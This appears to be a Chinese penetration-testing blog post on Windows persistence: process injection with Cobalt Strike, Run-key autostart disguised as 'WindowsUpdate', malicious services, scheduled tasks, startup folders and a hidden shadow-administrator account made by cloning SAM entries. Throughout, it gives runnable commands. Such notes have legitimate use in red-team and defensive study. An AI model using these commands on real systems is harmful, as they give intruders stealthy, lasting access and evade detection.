# 内网渗透-权限维持(3)

  
  
&lt;!--more--&gt;  
## 权限维持-进程迁移  
### 什么是进程迁移  
进程迁移（进程注入），是说当一个程序运行时本身没有一个独立的进程，而是通过相关技术把功能注入到某一个正在运行的进程当中，使运行的进程在进程列表当中无法查看到，这样就起到了利用已存在的进程来隐藏自身进程的作用，并且在权限维持的角度而言也起到了一定的作用。  
进程注入是一种广泛使用的躲避检测的技术，通常用于恶意软件或者无文件技术。其需要在另一个进程的地址空间内运行特质代码，进程注入改善了不可见性，同时一些技术也实现了持久性。  
大体上，进程注入可以分为两种形式  
- DLL注入  
- Shellcode注入  
这两种方式没有本质上的区别，在操作系统层面，dll也是shellcode汇编代码。为了开发方便，经常会将代码以dll的形式编译并传播，在实际注入的时候，由注入方或者被注入方调用loadlibrary加载  
### 使用进程迁移的目的  
- 隐藏进程  
- 权限维持  
### 使用进程迁移的场景  
在权限维持的角度来说，使用进程迁移最多的场景时windows server系列，因为服务器不会经常重启，所以，在某类需求的实战场景中也是使用最频繁最方便的一种方式。对于pc机的权限维持需求不太使用，pc机的重启率太高。  
### CobaltStrike中的进程迁移  
名词说明：Post-Exploitation Jobs(进程执行&#43;远程注入)  
`inject`和`shinject`命令可以将代码注入到任意远程进程中，该工具一些内置的Post-Exploitation job也会针对特定的远程进程。  
**cs使用**  
```  
beacon&gt; help inject  
Use: inject [pid] &lt;x86|x64&gt; [监听器]  
  
打开 [pid] 指定的进程并注入运行从 [监听器] 生成的shellcode  
```  
`psinject`  
```  
psinject时cs4.0&#43;版本才出现的，使用的是one-liner payload注入进程  
它向特定进程中注入非托管PowerShell并通过其执行指定的命令  
对于psinject、x64进程可以注入x86/x64的payload、x86进程只能注入x86  
  
beacon&gt; help psinject  
Use: psinject [pid] [x86|x64] [cmdlet] [参数]  
  
注入非托管Powershell到 [pid] 指定的进程中，然后执行 [cmdlect]，不会调用powershell.exe  
最后一次使用powershell-import导入的任何cmdlet也可以在这里使用  
```  
`shinject`  
```  
beacon&gt; help shinject  
Use: shinject [pid] &lt;x86|x64&gt; [/本地绝对路径/my.bin]  
  
打开 [pid] 指定的进程并注入运行本地shellcode文件  
```  
### bof实现的进程注入  
#### StaticSyscallsInject  
(64-bit only)  
Beacon object file to:  
- Inject shellcode(either custom or beacon)into remote process using NtOpenProcess-&gt;NtAllocateVirtualMemory-&gt;NtWriterVirtualMemory-&gt;NtCreateThreadEx  
使用方法  
```  
1、static_syscalls_shinjet 4052 /path/to/my.bin  
2、static_syscalls_inject 4972 http(监听器名称)  
```  
#### SyscallsInject  
使用方法  
```  
1、syscalls_shinject 4052 /path/to/my.bin  
2、syscalls_inject 4972 http(监听器名称)  
```  
## 权限维持-修改注册表实现自启动  
### 注册表简介  
注册表相当于Windows下的一个庞大的层次性数据库  
基本上有着系统所有的配置信息  
```  
注册表是windows操作系统中的一个核心数据库，其中存放着各种参数，直接控制着windows的启动、硬件驱动程序的装载以及一些windows应用程序的运行，从而在整个系统中起着核心作用  
```  
### 注册表组成  
注册表由  
- 键(rootkey)(也叫主键或称&#34;项&#34;)  
- 子键(subkey)(子项)  
- 值项(value)构成  
一个键就是分支中的一个文件夹，而子键就是这个文件夹中的子文件夹，子键同样也是一个键  
一个值项则是一个键的当前定义，由名称、数据类型以及分配的值组成  
一个键可以有一个或者多个值，每个值的名称各不相同，如果一个值的名称为空，则该值为该键的默认值  
### 五大根键  
- HKEY_USERS  
保存了存放在本地计算机口令列表中的用户标识和密码列表  
- HKEY_CURRENT_USER  
该根键包含了本地工作站中存放的当前登录的用户信息  
- HKEY_CURRENT_CONFIG  
该根键存放着当前用户桌面配置的数据  
- HKEY_CLASSES_ROOT  
该根键根据windows操作系统中所安装的应用程序的扩展名，来指定文件类型。  
- HKEY_LOCAL_MACHINE  
该根键存在本地计算机的硬件信息  
### 实现原理  
windows提供了专门的开机自启动注册表，在每次开机完成后，它都会在这个注册表键下遍历键值，以获取键值中的程序路径，并创建进程启动程序。所以，只需要在这个注册表键下添加想要设置启动程序的路径就可以。其中常见的两个路径，分别是  
```  
HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run  
HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run  
```  
注意：要修改`HKEY_LOCAL_MACHINE`主键的注册表，这要求具有管理员权限，而修改`HKEY_CURRENT_USER`主键的注册表，只需要用户默认权限就可以实现。  
`HKEY_LOCAL_MACHINE`键中的自启动项在windows注册表编辑器中的位置  
`\HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run`  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202503142209442.png)
### 命令行下的使用  
```  
reg add 命令介绍  
  
REG ADD KeyName [/v ValueName | /ve] [/t Type] [/s Separator] [/d Data] [/f] [/reg:32 | /reg:64]  
KeyName [\\Machine\]Fullkey  
		Machine 远程机器名 - 忽略默认到当前机器。远程机器上只有HKLM和HKU可用  
		FullKey ROOTKEY\SubKey  
		ROOTKEY [HKLM | HKCU | HKU | HKCC]  
		SubKey  所选ROOTKEY下的注册表项的完整名称  
/v      为注册表项添加空白值名称(默认)  
/ve     为注册表项添加空白值名称(默认)  
/t      RegKey 数据类型  
	    [REG_SZ | REG_MULTI_SZ | REG_EXPAND_SZ | REG_DWORD | REG_QWORD | REG_BINARY | REG_NONE]  
  
/s       指定一个在REG_MULTI_SZ数据字符串中用作分隔符的字符  
         如果忽略，则将&#34;\0&#34;用作分隔符  
/d       要分配给添加的注册表 ValueName 的数据  
/f       不用提示就强行覆盖现有注册表项  
```  
`REG ADD KeyName(这里使用FullKey全路径用于区分) /v xxx(所选项之下要添加的值名称 /t REG_SZ(值的类型) /d xxx(值内容) /f`   
```bash  
reg add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run /v WindowsUpdate /t REG_SZ /d &#34;C:\Users\f10wers13eicheng\Desktop\artifact.exe&#34; /f  
  
  
reg add HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run /v WindowsUpdate /t REG_SZ /d &#34;C:\Users\f10wers13eicheng\Desktop\artifact.exe&#34; /f  
```  
`reg query KeyName(FullKey) /f ValueName`  
`reg delete KeyName(FullKey) -v ValueName /f`  
## 权限维持-注册服务自启  
### 什么是系统服务  
服务是一种应用程序类型，它在后台运行。服务应用程序通常可以在本地和通过网络为用户提供一些功能，例如客户端/服务应用程序、Web服务器、数据库应用服务器以及其他基于服务器的应用程序。  
1、启动系统服务管理器的命令为:`services.msc`  
2、操作系统服务需要本地管理员权限  
3、服务在Windows启动后将以本地系统权限(system)执行  
### 系统服务的作用  
1、启动、停止、暂停、恢复或禁用远程和本地计算机服务  
2、管理本地和远程计算机上的服务  
3、设置服务失败时的故障恢复操作  
4、为特定的硬件配置文件启用或禁用服务  
5、查看每个服务的状态和描述  
### 命令行下创建服务  
如果账户具有本地管理员特权，则可以从命令提示符创建服务，参数&#34;`binpath&#34;`用于执行任意有效负载，而参数`&#34;auto&#34;`用于确保恶意服务将自动启动。  
**添加SC服务**  
```  
设置程序路径  
sc create &#34;scAutoRunTest&#34; binpath=&#34;cmd /c start /b C:\Users\Public\scAutoRunTest.exe&#34;  
设置对服务的描述  
sc description &#34;scAutoRunTest&#34; &#34;scAutoRunTest&#34;  
设置这个服务为自启动  
sc config &#34;scAutoRunTest&#34; start=auto  
启动服务  
net start &#34;scAutoRunTest&#34;  
sc start &#34;scAutoRunTest&#34;  
```  
**查询sc服务**  
`sc qc scAutoRunTest`  
**删除sc服务**  
`sc delete scAutoRunTest`  
### PowerShell创建服务  
```  
创建服务  
powershell.exe New-Service -Name &#34;scAutoRunTest&#34; -BinaryPathName &#39;cmd /c start /b C:\UserPublic\scAutoRunTest.exe&#39; -Description &#34;scAutoRunTest&#34; -StartupType Automatic  
启动服务  
sc start scAutoRunTest  
```  
**查询sc服务**  
`powershell.exe Get-Service -DisplayName &#34;scAutoRunTest&#34;`  
**删除sc服务**  
```  
powershell.exe Remove-Service-name &#34;scAutoRunTest&#34;  
  
Remove-Service-name仅在PS v6以上有效  
windows10 、Server 2016、2019内置的是PowerShell5.1  
```  
### SharPersist 创建服务  
Windows persistence toolkit written In C#  
SharpPersist支持在系统中创建新服务的持久性技术，在系统上安装新服务需要本地管理员的访问权限，该服务将在Windows启动后以本地系统执行。  
**添加sc服务**  
```  
execute-assembly /root/SharpPersist.exe -t service -c &#34;C:\Windows\System32\cmd.exe&#34; -a &#34;/c C:\Users\Public\scAutoRunTest.exe&#34; -n &#34;scAutoRunTest&#34; -m add  
```  
**查询sc服务**  
```  
execute-assembly /root/SharpPersist.exe -t service -m list -n &#34;scAutoRunTest&#34;  
```  
**删除sc服务**  
```  
execute-assembly /root/SharpPersist.exe -t service -n &#34;scAutoRunTest&#34; -m remove  
```  
## 权限维持-计划任务  
### 计划任务简介  
计划任务是系统的常见功能，利用任务计划功能，可以将任何脚本、程序或文档安排在某个最方便的时间去运行。任务计划在每次系统启动的时候启动并在后台运行。  
当我们需要在服务器上定时执行一些重复性的事件时使用的，可以通过计划任务程序来运行准备好的脚本，批处理文件、程序或命令，以其在某个特定的事件或条件中运行。  
### schtasks简介  
Windows操作系统提供了一个实用程序(schtasks.exe)，使用户能够在特定的日期和时间或条件中去执行程序或脚本。这种行为可作为一种持久性机制运行在权限维持需求上。操作Windows计划任务不需要管理员权限，但如果已获得比较高的系统权限，则可以进一步操纵，例如在用户登录期间或在空间状态期间执行任务  
- 图形化工具：taskschd.msc  
- 命令行工具：schtasks.exe  
### schtasks的使用  
```  
C:\Windows\System32&gt;schtasks /?  
  
SCHTASKS /parameter [arguments]  
  
描述:  
    允许管理员创建、删除、查询、更改、运行和中止本地或远程系统上的计划任  
    务。  
  
参数列表:  
    /Create         创建新计划任务。  
    /Delete         删除计划任务。  
    /Query          显示所有计划任务。  
    /Change         更改计划任务属性。  
    /Run            按需运行计划任务。  
    /End            中止当前正在运行的计划任务。  
    /ShowSid        显示与计划的任务名称相应的安全标识符。  
    /?              显示此帮助消息。  
  
Examples:  
    SCHTASKS  
    SCHTASKS /?  
    SCHTASKS /Run /?  
    SCHTASKS /End /?  
    SCHTASKS /Create /?  
    SCHTASKS /Delete /?  
    SCHTASKS /Query  /?  
    SCHTASKS /Change /?  
    SCHTASKS /ShowSid /?  
```  
**添加定时任务**  
```  
C:\Users\f10wers13eicheng&gt;schtasks /create /?  
  
SCHTASKS /Create [/S system [/U username [/P [password]]]]  
    [/RU username [/RP password]] /SC schedule [/MO modifier] [/D day]  
    [/M months] [/I idletime] /TN taskname /TR taskrun [/ST starttime]  
    [/RI interval] [ {/ET endtime | /DU duration} [/K] [/XML xmlfile] [/V1]]  
    [/SD startdate] [/ED enddate] [/IT | /NP] [/Z] [/F] [/HRESULT] [/?]  
  
描述:  
     允许管理员在本地或远程系统上创建计划任务。  
  
参数列表:  
    /S   system        指定要连接到的远程系统。如果省略这个  
                       系统参数，默认是本地系统。  
  
    /U   username      指定应在其中执行 SchTasks.exe 的用户上下文。  
  
    /P   [password]    指定给定用户上下文的密码。如果省略则  
                       提示输入。  
  
    /RU  username      指定任务在其下运行的“运行方式”用户  
                       帐户(用户上下文)。对于系统帐户，有效  
                       值是 &#34;&#34;、&#34;NT AUTHORITY\SYSTEM&#34; 或  
                       &#34;SYSTEM&#34;。  
                       对于 v2 任务，&#34;NT AUTHORITY\LOCALSERVICE&#34;和  
                       &#34;NT AUTHORITY\NETWORKSERVICE&#34;以及常见的 SID  
                         对这三个也都可用。  
  
    /RP  [password]    指定“运行方式”用户的密码。要提示输  
                       入密码，值必须是 &#34;*&#34; 或无。系统帐户会忽略该  
                       密码。必须和 /RU 或 /XML 开关一起使用。  
  
/RU/XML    /SC   schedule     指定计划频率。  
                       有效计划任务:  MINUTE、 HOURLY、DAILY、WEEKLY、  
                       MONTHLY, ONCE, ONSTART, ONLOGON, ONIDLE, ONEVENT.  
  
    /MO   modifier     改进计划类型以允许更好地控制计划重复  
                       周期。有效值列于下面“修改者”部分中。  
  
    /D    days         指定该周内运行任务的日期。有效值:  
                       MON、TUE、WED、THU、FRI、SAT、SUN  
                       和对 MONTHLY 计划的 1 - 31  
                       (某月中的日期)。通配符“*”指定所有日期。  
  
    /M    months       指定一年内的某月。默认是该月的第一天。  
                       有效值: JAN、FEB、MAR、APR、MAY、JUN、  
                       JUL、 AUG、SEP、OCT、NOV  和 DEC。通配符  
                       “*” 指定所有的月。  
  
    /I    idletime     指定运行一个已计划的 ONIDLE 任务之前  
                       要等待的空闲时间。  
                       有效值范围: 1 到 999 分钟。  
  
    /TN   taskname     以路径\名称形式指定  
                       对此计划任务进行唯一标识的字符串。  
  
    /TR   taskrun      指定在这个计划时间运行的程序的路径  
                       和文件名。  
                       例如: C:\windows\system32\calc.exe  
  
    /ST   starttime    指定运行任务的开始时间。  
                       时间格式为 HH:mm (24 小时时间)，例如 14:30 表示  
                       2:30 PM。如果未指定 /ST，则默认值为  
                       当前时间。/SC ONCE 必需有此选项。  
  
    /RI   interval     用分钟指定重复间隔。这不适用于  
                       计划类型: MINUTE、HOURLY、  
                       ONSTART, ONLOGON, ONIDLE, ONEVENT.  
                       有效范围: 1 - 599940 分钟。  
                       如果已指定 /ET 或 /DU，则其默认值为  
                       10 分钟。  
  
    /ET   endtime      指定运行任务的结束时间。  
                       时间格式为 HH:mm (24 小时时间)，例如，14:50 表示 2:50 PM。  
                       这不适用于计划类型: ONSTART、  
                       ONLOGON, ONIDLE, ONEVENT.  
  
    /DU   duration     指定运行任务的持续时间。  
                       时间格式为 HH:mm。这不适用于 /ET 和  
                       计划类型: ONSTART, ONLOGON, ONIDLE, ONEVENT.  
                       对于 /V1 任务，如果已指定 /RI，则持续时间默认值为  
                       1 小时。  
  
    /K                 在结束时间或持续时间终止任务。  
                       这不适用于计划类型: ONSTART、  
                       ONLOGON, ONIDLE, ONEVENT.  
                       必须指定 /ET 或 /DU。  
  
    /SD   startdate    指定运行任务的第一个日期。  
                       格式为 yyyy/mm/dd。默认值为  
                       当前日期。这不适用于计划类型: ONCE、  
                       ONSTART, ONLOGON, ONIDLE, ONEVENT.  
  
    /ED   enddate      指定此任务运行的最后一天的日期。  
                       格式是 yyyy/mm/dd。这不适用于计划类型:  
                        ONCE、ONSTART、ONLOGON、ONIDLE。  
  
    /EC   ChannelName  为 OnEvent 触发器指定事件通道。  
  
    /IT                仅有在 /RU 用户当前已登录且  
                       作业正在运行时才可以交互式运行任务。  
                       此任务只有在用户已登录的情况下才运行。  
  
    /NP                不储存任何密码。任务以给定用户的身份  
                       非交互的方式运行。只有本地资源可用。  
  
    /Z                 标记在最终运行完任务后删除任务。  
  
    /XML  xmlfile      从文件的指定任务 XML 中创建任务。  
                       可以组合使用 /RU 和 /RP 开关，或者在任务 XML 已包含  
                       主体时单独使用 /RP。  
  
    /V1                创建 Vista 以前的平台可以看见的任务。  
                       不兼容 /XML。  
  
    /F                 如果指定的任务已经存在，则强制创建  
                       任务并抑制警告。  
  
    /RL   level        为作业设置运行级别。有效值为  
                       LIMITED 和 HIGHEST。默认值为 LIMITED。  
  
    /DELAY delaytime   指定触发触发器后延迟任务运行的  
                       等待时间。时间格式为  
                       mmmm:ss。此选项仅对计划类型  
                       ONSTART, ONLOGON, ONEVENT.  
  
    /HRESULT          为获得更出色的故障诊断能力，处理退出代码  
                       将采用 HRESULT 格式。  
  
    /?                 显示此帮助消息。  
  
修改者: 按计划类型的 /MO 开关的有效值:  
    MINUTE:  1 到 1439 分钟。  
    HOURLY:  1 - 23 小时。  
    DAILY:   1 到 365 天。  
    WEEKLY:  1 到 52 周。  
    ONCE:    无修改者。  
    ONSTART: 无修改者。  
    ONLOGON: 无修改者。  
    ONIDLE:  无修改者。  
    MONTHLY: 1 到 12，或  
             FIRST, SECOND, THIRD, FOURTH, LAST, LASTDAY。  
  
    ONEVENT:  XPath 事件查询字符串。  
示例:  
    ==&gt; 在远程机器 &#34;ABC&#34; 上创建计划任务 &#34;doc&#34;，  
        该机器每小时在 &#34;runasuser&#34; 用户下运行 notepad.exe。  
  
        SCHTASKS /Create /S ABC /U user /P password /RU runasuser  
                 /RP runaspassword /SC HOURLY /TN doc /TR notepad  
  
    ==&gt; 在远程机器 &#34;ABC&#34; 上创建计划任务 &#34;accountant&#34;，  
        在指定的开始日期和结束日期之间的开始时间和结束时间内，  
        每隔五分钟运行 calc.exe。  
  
        SCHTASKS /Create /S ABC /U domain\user /P password /SC MINUTE  
                 /MO 5 /TN accountant /TR calc.exe /ST 12:00 /ET 14:00  
                 /SD 06/06/2006 /ED 06/06/2006 /RU runasuser /RP userpassword  
  
    ==&gt; 创建计划任务 &#34;gametime&#34;，在每月的第一个星期天  
        运行“空当接龙”。  
  
        SCHTASKS /Create /SC MONTHLY /MO first /D SUN /TN gametime  
                 /TR c:\windows\system32\freecell  
  
    ==&gt; 在远程机器 &#34;ABC&#34; 创建计划任务 &#34;report&#34;，  
        每个星期运行 notepad.exe。  
  
        SCHTASKS /Create /S ABC /U user /P password /RU runasuser  
                 /RP runaspassword /SC WEEKLY /TN report /TR notepad.exe  
  
    ==&gt; 在远程机器 &#34;ABC&#34; 创建计划任务 &#34;logtracker&#34;，  
        每隔五分钟从指定的开始时间到无结束时间，  
        运行 notepad.exe。将提示输入 /RP  
        密码。  
  
        SCHTASKS /Create /S ABC /U domain\user /P password /SC MINUTE  
                 /MO 5 /TN logtracker  
                 /TR c:\windows\system32\notepad.exe /ST 18:30  
                 /RU runasuser /RP  
  
    ==&gt; 创建计划任务 &#34;gaming&#34;，每天从 12:00 点开始到  
        14:00 点自动结束，运行 freecell.exe。  
  
        SCHTASKS /Create /SC DAILY /TN gaming /TR c:\freecell /ST 12:00  
                 /ET 14:00 /K  
    ==&gt; 创建计划任务“EventLog”以开始运行 wevtvwr.msc  
        只要在“系统”通道中发布事件 101  
  
        SCHTASKS /Create /TN EventLog /TR wevtvwr.msc /SC ONEVENT  
                 /EC System /MO *[System/EventID=101]  
    ==&gt; 文件路径中可以加入空格，但需要加上两组引号，  
        一组引号用于 CMD.EXE，另一组用于 SchTasks.exe。用于 CMD  
        的外部引号必须是一对双引号；内部引号可以是一对单引号或  
        一对转义双引号:  
        SCHTASKS /Create  
           /tr &#34;&#39;c:\program files\internet explorer\iexplorer.exe&#39;  
           \&#34;c:\log data\today.xml\&#34;&#34; ...  
```  
**使用案例**  
```  
非管理员权限如下  
/sc DAILY  
每间隔一天执行一次  
schtasks /create /tn scAutoRunTest /tr &#34;C:\USers\Public\scAutoRunTest.exe&#34; /SC daily /sd 1999/01/01 /ed 2099/12/31  
  
/sc MINUTE  
每间隔一分钟执行一次，重启用户登录后过一分钟会执行一次  
schtasks /create /tn sctAutorunTest /tr &#34;C:\Users\Public\sctAutorunTest.exe&#34; /sc minute /st 00:00 /et 23:59  
  
只执行一次，重启用户登录后执行一次（高低权限皆可使用/继承当前用户权限）  
schtasks /create /tn sctAutorunTest /tr &#34;C:\Users\Public\sctAutorunTest.exe&#34; /sc minute /st 00:00 /et 23:59 /mo 1 /f  
  
管理员权限下  
/sc onlogon  
用户登录时执行  
schtasks /create /tn sctAutorunTest /tr &#34;C:\Users\Public\sctAutorunTest.exe&#34; /sc onlogon /f  
  
/sc onstart  
系统启动时执行  
schtasks /create /tn sctAutorunTest /tr &#34;C:\Users\Public\sctAutorunTest.exe&#34; /sc onstart /f  
  
On User Idle (5mins)  
schtasks /create /tn sctAutorunTest /tr &#34;C:\Users\Public\sctAutorunTest.exe&#34; /sc onidle /f /i 5  
  
启动定时任务  
/tn 计划任务的名称  
/i  忽略任何限制立即运行任务  
schtasks /run /i /tn sctAutoRunTest  
查看定时任务  
/FO format 为输出制定格式。有效值：TABLE、LIST、CSV  
/V         显示详细任务输出  
/TN taskname 指定要检索其信息的任务名称，否则会检索所有任务名称的信息。  
  
schtasks /query /fo TABLE /tn sctAutorunTest  
schtasks /query /fo LIST /tn sctAutorunTest  
  
显示详细任务输出  
schtasks /query /v /fo TABLE /tn sctAutorunTest  
schtasks /query /v /fo LIST /tn sctAutorunTest  
  
删除定时任务  
/TN taskname 指定要删除的计划任务名称。可以使用通配符 &#34;*&#34; 来删除所有任务。  
/F 强制删除该任务，如果指定的任务当前正在运行，则抑制警告。  
schtasks /delete /tn sctAutoRunTest /f  
```  
### SharPersist使用  
**添加定时任务**  
```  
管理员权限  
execute-assembly /root/SharPersist.exe -t schtask -c &#34;C:\Windows\System32\cmd.exe&#34; -a &#34;/c C:\Users\Public\sctAutorunTest.exe&#34; -n &#34;sctAutorunTest&#34; -m add -o logon  
  
普通用户组权限  
execute-assembly /root/SharPersist.exe -t schtask -c &#34;C:\Windows\System32\cmd.exe&#34; -a &#34;/c C:\Users\Public\sctAutorunTest.exe&#34; -n &#34;sctAutorunTest&#34; -m add -o hourly  
  
execute-assembly /root/SharPersist.exe -t schtask -c &#34;C:\Windows\System32\cmd.exe&#34; -a &#34;/c C:\Users\Public\sctAutorunTest.exe&#34; -n &#34;sctAutorunTest&#34; -m add -o daily  
```  
**查看定时任务**  
```  
execute-assembly /root/SharPersist.exe -t schtask -m list -n &#34;sctAutorunTest&#34;  
```  
**删除定时任务**  
```  
execute-assembly /root/SharPersist.exe -t schtask -c &#34;C:\Windows\System32\cmd.exe&#34; -a &#34;/c C:\Users\Public\sctAutorunTest.exe&#34; -n &#34;sctAutorunTest&#34; -m remove  
```  
## 权限维持-隐蔽账号和启动  
### **启动目录**  
**当前用户启动目录**  
开始-运行（win&#43;r）  
`shell:startup`  
打开的文件夹即为当前用户的启动目录  
仅对当前用户生效  
```  
C:\Users\f10wers13eicheng\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup  
```  
**所有用户启动目录**  
```  
shell:common startup  
```  
打开的目录即为所有用户的启动文件夹  
```  
C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup  
```  
### 创建隐蔽账号  
**创建账号**  
在创建的用户名后加`$`，即为隐藏账户  
```  
net user test$ admin /add #添加隐藏用户  
net localgroup administrators test$ /add #添加到管理员组中  
```  
 **导出注册表**  
`[HKEY_LOCAL_MACHINE\SAM\SAM]`   
默认情况下这个项里没有任何内容，这是因为用户对它没有权限。右键菜单里为administrator赋予完全控制权限。  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202503182103268.png)
`[SAMDomains\AccountUserslNames]`  
项里显示了系统当前存在的所有账户，选中`test$`，在其右侧有一个名为&#34;默认&#34;，类型为`0x3eb`的键值。其中`3eb`就是`test$`用户`SID`的结尾，即RID(这里使用十六进制表示)  
`[SAM\Domains\Account\Users]`  
里有一个以&#34;3EB&#34;结尾的子项，这两个项里存放了用户`test$`的信息。  
在这两个项上单击右键，执行&#34;导出&#34;命令，将这两个项的值分别导出成扩展名为`.reg`的注册表文件  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202503182112620.png)
  
**cmd下删除用户**  
cmd中将`test$`用户删除，再次刷新注册表，此时上述的两项都没了  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202503182116544.png)
**导入注册表**  
刚才导出的两个注册表文件重新导入，此时在注册表里就有了`test$`账户的信息，但无论在命令行还是图形界面都无法看到这个账户，账户就被彻底隐藏了。使用这个隐藏账户可以登陆系统，但缺点是仍然会产生用户配置文件，下面在对这个账户进一步处理，以使之完全隐藏。  
**修改注册表**  
展开到上面的注册表项中，找到 administrator 用户 的 RID 值“1f4”,展开对应的“000001F4&#34;项，其右侧有一个名为F的键值，这个键值中就存放了用户的 SID。下面将这个键值的数据全部复制，并粘贴到“000003EB&#34;项的F键值中，也就是将administrator 用户的 SID 复制给了 test\$,这样在操作系统内部，实际上就把 test\$当做是 administrator, test\$成了administrator 的影子账户，与其使用同一个用户配置文件，test\$也就被彻底隐藏了。  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202503182128863.png)
## 权限维持-CS相关插件  
### SharPersist  
**Adding Persist**  
https://github.com/mandiant/SharPersist  
  

---

> Author: N1Rvana  
> URL: http://localhost:1313/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%813/  

